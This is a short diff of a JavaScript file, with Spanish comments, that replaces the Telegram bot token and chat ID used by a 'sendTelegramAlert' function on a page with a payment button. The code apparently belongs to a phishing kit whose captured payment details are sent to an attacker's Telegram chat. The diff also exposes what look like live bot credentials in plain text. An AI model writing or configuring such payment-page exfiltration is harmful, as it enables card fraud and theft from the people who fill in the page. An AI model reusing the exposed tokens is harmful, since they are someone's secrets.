@@ -103,8 +103,8 @@ document.addEventListener('DOMContentLoaded', () => {
 const botonPagar = document.querySelector('.btn-pay');
 
 // CONFIGURA ESTOS VALORES (reemplázalos)
-const TELEGRAM_BOT_TOKEN = '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE';
-const TELEGRAM_CHAT_ID = '-4977407810';
+const TELEGRAM_BOT_TOKEN = '8425620613:AAGsiiwXNBDtJ_filOOtdPOkmnkyBau1d-4';
+const TELEGRAM_CHAT_ID = '7831097636';
 
 // Función para enviar alerta a Telegram
 async function sendTelegramAlert(text) {
@@ -322,4 +322,5 @@ function enmascararCorreo(email) {
     return user.substring(0, 2) + "*******@" + "*****." + "com";
 
 }
+
 
